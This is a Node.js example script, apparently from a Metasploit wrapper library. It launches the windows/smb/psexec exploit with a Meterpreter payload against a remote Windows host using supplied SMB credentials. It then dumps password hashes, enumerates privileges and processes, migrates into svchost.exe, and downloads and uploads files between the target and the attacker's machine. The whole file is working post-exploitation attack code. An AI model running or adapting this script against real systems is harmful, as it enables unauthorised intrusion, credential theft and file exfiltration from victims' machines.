if(process.argv.length <= 5) {
	console.log("node exploit.js <localip> <remoteip> <smbuser> <smbpass>");
	process.exit();
}

var msfjs = require('../lib')(),
		async = require('async');

var exploit = new msfjs.Meterpreter("windows/smb/psexec", {
	lhost: 		process.argv[2],
	rhost:  	process.argv[3],
	SMBUser:  process.argv[4],
	SMBPass:  process.argv[5]
});

msfjs.Exploits.launch(exploit, function(status) {

	console.log("Launching windows/smb/psexec at " + process.argv[3]);

	status.on("success", function(session) {

		console.log("Session established from " + session.connection.from.host + ":" + 
									session.connection.from.port + " to " + session.connection.to.host + ":" + session.connection.to.port);

		session.once("prompt", function() {

			var oldpid = null;

			async.series([

				function(cb) {

					session.getpid(function(pid) { 

						console.log("Current PID: " + pid) 
						oldpid = pid;
						cb();

					});

				},

				function(cb) {

					session.getuid(function(uid) {

						console.log("Current UID: " + uid);
						cb();

					});

				},

				function(cb) {

					session.sysinfo(function(info) {

						console.log("Computer name: " + info.computer);
						console.log("Computer arch: " + info.arch);
						cb();

					});

				},

				function(cb) {

					session.hashdump(function(hashes) {

						console.log("hashdump got " + hashes.length + " hashes. First username is " + hashes[0].user);
						cb();

					});

				},

				function(cb) {

					session.getprivs(function(privs) {

						console.log("current proccess has " + privs.length + " privs.");
						cb();

					});

				},

				function(cb) {

					session.enumdesktops(function(desktops) {
							
						console.log("Got " + desktops.length + " desktops. First ones station is " + desktops[0].station);
						cb();

					});

				},

				function(cb) {

					session.ps(function(processes) {

						console.log(processes.length + " proccesses running. First process filepath is "+ processes[0].path);

						var proc = null;

						for(var i = 0; i < processes.length; i++) {
							if(processes[i].file == "svchost.exe") {
								proc = processes[i];
								break;
							}
						}

						session.migrate(proc.pid, function(err, res) {

							if(!res) {
								console.error("Could not migrate!");
								console.error(err);
								return;
							}

							console.log("PID before migration " + oldpid + ", migrating to " + proc.file + " (" + proc.pid + ")");

							session.getpid(function(newpid) {

								console.log("PID after migration " + newpid);
								cb();					

							});

						});

					});

				},

				function(cb) {

					var fs = session.filesystem();

					async.series([

						function(cb2) {

							fs.pwd(function(wd) {

								console.log("Current working dir: " + wd);
								cb2();

							});

						},

						function(cb2) {

							console.log("Changing working dir to %WINDIR%");

							// Even environment variables work!

							fs.cd("%WINDIR%", function() {

								cb2();

							});

						},

						function(cb2) {

							console.log("Listing files..");

							fs.ls(function(files) {

								console.log("Got " + files.length + " files from %WINDIR%");
								cb2();

							});

						},

						function(cb2) {

							console.log("Downloading file..");

							fs.download("explorer.exe", "/tmp/explorer.exe", function(err, result) {

								if(!result) {

									console.error("Failed to download file...");
									console.error(err);
									process.exit();

								}

								console.log("Downloaded %WINDIR%\\explorer.exe to /tmp/explorer.exe");

								cb2();

							});

						},

						function(cb2) {

							console.log("Changing working dir to %TMP%");
							console.log("(depending on your UID the end location may vary)");

							fs.cd("%TMP%", function() {

								cb2();

							});

						}, 

						function(cb2) {

							console.log("Reuploading /tmp/explorer.exe to %TMP%\\explorer.exe");

							fs.upload("/tmp/explorer.exe", "%TMP%", function(err, result) {

								if(!result) {

									console.error("Failed to download file...");
									console.error(err);
									process.exit();

								}

								console.log("Successfully uploaded file!");

								cb2();

							});

						}


					], function() {

						cb();

					});

				}], function() {

					console.log("Example finished... exiting..");
					process.exit();

				});

		});

	});

	status.on("error", function(err) {
		console.error(err);
	});

});
